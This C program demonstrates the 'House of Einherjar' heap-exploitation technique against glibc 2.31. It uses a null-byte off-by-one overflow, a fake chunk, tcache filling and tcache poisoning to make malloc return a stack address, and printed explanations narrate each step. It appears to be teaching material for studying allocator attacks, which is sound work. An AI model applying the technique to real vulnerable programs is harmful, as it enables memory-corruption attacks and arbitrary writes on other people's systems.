#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <malloc.h>
#include <assert.h>

int main()
{
    /*
     * This modification to The House of Enherjar works with the tcache-option enabled on glibc-2.31.
     * The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc().
     * It has the additional requirement of a heap leak. 
     * 
     * After filling the tcache list to bypass the restriction of consolidating with a fake chunk,
     * we target the unsorted bin (instead of the small bin) by creating the fake chunk in the heap.
     * The following restriction for normal bins won't allow us to create chunks bigger than the memory
     * allocated from the system in this arena:
     *
     * https://sourceware.org/git/?p=glibc.git;a=commit;f=malloc/malloc.c;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c */

    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    printf("Welcome to House of Einherjar 2!\n");
    printf("Tested on Ubuntu 20.04 64bit (glibc-2.31).\n");
    printf("This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");

    printf("This file demonstrates a tcache poisoning attack by tricking malloc into\n"
           "returning a pointer to an arbitrary location (in this case, the stack).\n");

    // prepare the target
    intptr_t stack_var[4];
    printf("\nThe address we want malloc() to return is %p.\n", (char *) &stack_var);

    printf("\nWe allocate 0x38 bytes for 'a' and use it to create a fake chunk\n");
    intptr_t *a = malloc(0x38);

    // create a fake chunk
    printf("\nWe create a fake chunk preferably before the chunk(s) we want to overlap, and we must know its address.\n");
    printf("We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n");

    a[0] = 0;    // prev_size (Not Used)
    a[1] = 0x60; // size
    a[2] = (size_t) a; // fwd
    a[3] = (size_t) a; // bck

    printf("Our fake chunk at %p looks like:\n", a);
    printf("prev_size (not used): %#lx\n", a[0]);
    printf("size: %#lx\n", a[1]);
    printf("fwd: %#lx\n", a[2]);
    printf("bck: %#lx\n", a[3]);

    printf("\nWe allocate 0x28 bytes for 'b'.\n"
           "This chunk will be used to overflow 'b' with a single null byte into the metadata of 'c'\n"
           "After this chunk is overlapped, it can be freed and used to launch a tcache poisoning attack.\n");
    uint8_t *b = (uint8_t *) malloc(0x28);
    printf("b: %p\n", b);

    int real_b_size = malloc_usable_size(b);
    printf("Since we want to overflow 'b', we need the 'real' size of 'b' after rounding: %#x\n", real_b_size);

    /* In this case it is easier if the chunk size attribute has a least significant byte with
     * a value of 0x00. The least significant byte of this will be 0x00, because the size of 
     * the chunk includes the amount requested plus some amount required for the metadata. */
    printf("\nWe allocate 0xf8 bytes for 'c'.\n");
    uint8_t *c = (uint8_t *) malloc(0xf8);

    printf("c: %p\n", c);

    uint64_t* c_size_ptr = (uint64_t*)(c - 8);
    // This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit

    printf("\nc.size: %#lx\n", *c_size_ptr);
    printf("c.size is: (0x100) | prev_inuse = 0x101\n");

    printf("We overflow 'b' with a single null byte into the metadata of 'c'\n");
    b[real_b_size] = 0;
    printf("c.size: %#lx\n", *c_size_ptr);

    printf("It is easier if b.size is a multiple of 0x100 so you "
           "don't change the size of b, only its prev_inuse bit\n");

    // Write a fake prev_size to the end of b
    printf("\nWe write a fake prev_size to the last %lu bytes of 'b' so that "
           "it will consolidate with our fake chunk\n", sizeof(size_t));
    size_t fake_size = (size_t)((c - sizeof(size_t) * 2) - (uint8_t*) a);
    printf("Our fake prev_size will be %p - %p = %#lx\n", c - sizeof(size_t) * 2, a, fake_size);
    *(size_t*) &b[real_b_size-sizeof(size_t)] = fake_size;

    // Change the fake chunk's size to reflect c's new prev_size
    printf("\nMake sure that our fake chunk's size is equal to c's new prev_size.\n");
    a[1] = fake_size;

    printf("Our fake chunk size is now %#lx (b.size + fake_prev_size)\n", a[1]);

    // Now we fill the tcache before we free chunk 'c' to consolidate with our fake chunk
    printf("\nFill tcache.\n");
    intptr_t *x[7];
    for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++) {
        x[i] = malloc(0xf8);
    }

    printf("Fill up tcache list.\n");
    for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++) {
        free(x[i]);
    }

    printf("Now we free 'c' and this will consolidate with our fake chunk since 'c' prev_inuse is not set\n");
    free(c);
    printf("Our fake chunk size is now %#lx (c.size + fake_prev_size)\n", a[1]);

    printf("\nNow we can call malloc() and it will begin in our fake chunk\n");
    intptr_t *d = malloc(0x158);
    printf("Next malloc(0x158) is at %p\n", d);

    // tcache poisoning
    printf("After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n"
           "We have to create and free one more chunk for padding before fd pointer hijacking.\n");
    uint8_t *pad = malloc(0x28);
    free(pad);

    printf("\nNow we free chunk 'b' to launch a tcache poisoning attack\n");
    free(b);
    printf("Now the tcache list has [ %p -> %p ].\n", b, pad);

    printf("We overwrite b's fwd pointer using chunk 'd'\n");
    d[0x30 / 8] = (long) stack_var;

    // take target out
    printf("Now we can cash out the target chunk.\n");
    malloc(0x28);
    intptr_t *e = malloc(0x28);
    printf("\nThe new chunk is at %p\n", e);

    // sanity check
    assert(e == stack_var);
    printf("Got control on target/stack!\n\n");
}
